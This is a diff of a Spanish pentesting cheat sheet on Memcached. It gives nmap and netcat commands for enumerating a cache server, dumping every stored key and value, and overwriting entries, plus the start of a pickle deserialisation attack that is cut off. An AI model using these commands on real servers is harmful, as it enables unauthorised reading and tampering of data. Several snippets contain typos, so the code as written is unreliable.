@@ -1,18 +1,20 @@
-## Info
-### Nmap
+# Memcached
+Es un sistema distribuido de propósito general para caché basado en memoria.
+## Enumeración
+### Obtener información con nmap
 ```bash
 nmap -p port --script memcached-info IP
 ```
-### Netcat/Telnet
-#### Conexion
+## Interacción con el servicio
+### Conexión
 ```bash
 nc IP PORT
 ```
-#### Version 
+#### Obtener version 
 ```bash
 echo -e 'version1\r\nquit\r\n' | nc IP PORT
 ```
-#### Obtener la lista de keys con Python
+#### Obtener la lista de keys (Python)
 ```python
 from pymemcache.client.base import Client
 import pprint
@@ -25,7 +27,7 @@ for i in range(0 , 7):
 ```
 echo -e 'lru_crawler metadump all\r\nquit\r\n' | nc IP PORT | grep 'fetch=yes'
 ```
-#### Obtener el valor de una key
+#### Obtener el valor de una key concreta
 ```bash
 echo -e 'get KEYNAME1\r\nquit\r\n' | nc IP PORT
 ```
@@ -40,7 +42,7 @@ echo -e 'stats items1\r\nquit\r\n' | nc IP PORT | grep 'number '
 ```
 Y sumamos los numeros de cada item 
 
-##### Python Implementation
+#### Obtener el numero total de parejas key value en el servidor (Python)
 
 ```python
 python -c 'from pymemcache.client.base import Client; client = Client(("IP", PORT)); printclient.stats()["curr_items"]'
@@ -57,26 +59,18 @@ nc IP PORT
 > replace CLAVE 0 0 LENGHT
 > VALUE 
 ```
-#### Dump
-
-##### Bash
+### Dump de todos los valores usando bash
 ```bash
 xargs -L1 -I% sh -c 'echo "get KEYNAME" | nc IP PORT'
 for key in $(memcdump --server=IP); do echo ------ $key ------; memccat --server=IP $key; done
 for key in $(memcdump --server=target-1); do echo ------ $key ------; memccat --server=target-1 $key; done
 ```
-##### Metasploit module
-```msf
-auxiliary/gather/memcached_extractor
-```
-### Injections 
+## Explotación
 #### Libro de referencia 
 ```
 https://www.blackhat.com/docs/us-14/materials/us-14-Novikov-The-New-Page-Of-Injections-Book-Memcached-Injections-WP.pdf
 ```
-#### Python Pickle Serlization Attack
-
-Ante un mensaje de error de pickle 
+#### Python Pickle Serlization Attack 
 ```python
 import pickle
 import subprocess
